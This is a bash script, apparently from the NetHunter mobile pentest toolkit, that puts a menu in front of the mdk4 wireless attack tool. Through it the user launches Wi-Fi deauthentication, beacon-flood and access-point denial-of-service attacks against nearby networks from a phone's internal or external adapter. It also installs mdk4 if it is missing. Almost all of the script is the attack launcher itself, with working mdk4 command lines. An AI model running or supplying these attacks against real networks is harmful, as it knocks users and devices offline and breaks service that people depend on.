#!/bin/bash

########################################
#  NetHunter mdk4 user-fiendly script  #
########################################

########## FUNCTIONS ##########

main_menu(){
    clear
    printf "[*] Welcome to the Mdk4\n\n"
    printf "[*] Select which interface you using for attack? (1-2)\n\n"
    printf "1. wlan0 (Internal Nexus Wifi)\n"
    printf "2. wlan1 (External Wifi card)\n\n"
    read -p "Choice (1-2): " iface_select
    case $iface_select in
        1) iface=" "; attack_menu;;
        2) iface="wlan1"; attack_menu;;
        3) exit;;
        *) printf "[!] Wrong number! Try again...\n"; sleep 1; main_menu;;
    esac
}

attack_menu(){
    clear
    printf "[*] Select which mode you want to use? (1-3)\n\n"
    printf "1. Deauthentication\n"
    printf "2. Beacon Flood\n"
    printf "3. Denial Of Service\n\n"
    read -p "Choice (1-3): " mode
    case $mode in
        1) f_deauth;;
        2) f_bcn;;
        3) f_dos;;
        *) printf "[!] Wrong number! Try again...\n"; sleep 1; attack_menu;;
    esac
}

f_deauth(){
    
    trap ctrl_c INT

    function ctrl_c() {
        printf "\n[*] Ctrl-C by user\n"
        # do the jobs
    }
    
    clear
    read -p "[*] Start attack? (Y/n): " question
    case $question in
        [yY][eE][sS]|[yY])
            if [ -z $iface ]; then printf "\n[*] Starting nexmon on wlan0...\n"; sleep 1; . monstart-nh; printf "\n[*] Launching MDK4...\n\n"; sleep 1; mdk4 wlan0 d; printf "\n\n[*] Stopping nexmon on wlan0...\n"; sleep 1; . monstop-nh; else printf "\n[*] Launching MDK4...\n\n"; sleep 1; mdk4 wlan1 d; fi
            ;;
        [nN][oO]|[nN])
            exit
            ;;
        *) 
            printf "[!] Wrong answer! Try again...\n"; sleep 1; f_deauth;;
    esac
}

f_bcn(){
    
    trap ctrl_c INT

    function ctrl_c() {
        printf "[*] \nCtrl-C by user\n"
        # do the jobs
    }
    
    clear
    read -p "[*] Start attack? (Y/n): " question
    case $question in
        [yY][eE][sS]|[yY])
            if [ -z $iface ]; then printf "\n[*] Starting nexmon on wlan0...\n"; sleep 1; . monstart-nh; printf "\n[*] Launching MDK4...\n\n"; sleep 1; mdk4 wlan0 b -a -s 2700; printf "\n\n[*] Stopping nexmon on wlan0...\n"; sleep 1; . monstop-nh; else printf "\n[*] Launching MDK4...\n\n"; sleep 1; mdk4 wlan1 b -a -s 2700 ; fi
            ;;
        [nN][oO]|[nN])
            exit
            ;;
        *) 
            printf "[!] Wrong answer! Try again...\n"; sleep 1; f_bcn;;
    esac
}


f_dos(){
    
    trap ctrl_c INT

    function ctrl_c() {
        printf "\n[*] Ctrl-C by user\n"
        # do the jobs
    }
    
    clear
    read -p "[*] Start attack? (Y/n): " question
    case $question in
        [yY][eE][sS]|[yY])
            if [ -z $iface ]; then printf "\n[*] Starting nexmon on wlan0...\n"; sleep 1; . monstart-nh; printf "\n[*] Launching MDK4...\n\n"; sleep 1; mdk4 wlan0 a; printf "\n\b[*] Stopping nexmon on wlan0...\n"; sleep 1; . monstop-nh; else printf "\n[*] Launching MDK4...\n\n"; sleep 1; mdk4 wlan1 a; fi
            ;;
        [nN][oO]|[nN])
            exit
            ;;
        *) 
            printf "[*] Wrong answer! Try again...\n"; sleep 1; f_dos;;
    esac
}

mdk4_check(){
    command -v mdk4 >/dev/null 2>&1 || { clear; printf >&2 "MDK4\e[91m is not installed!\n\e[0m"; mdk4_install;exit; }
}

mdk4_install(){
    read -p "[*] Install mdk4? (Y/n): "  install
    case $install in
        [yY][eE][sS]|[yY])
            clear
            printf "\e[92m[*] Installing...\n\e[0m"
            apt-get update
            apt-get install mdk4 -y
            printf "\e[92m\n[*] Done\n\e[0m"
            ;;
        [nN][oO]|[nN])
            printf "\n[!] Kernel Panic - not syncing: Attempted to kill init!\n"
            exit
            ;;
        *)
            printf "[!] Wrong answer! Try again...\n"; sleep 1; mdk4_check
            ;;
    esac
}

########## START ##########
mdk4_check
main_menu
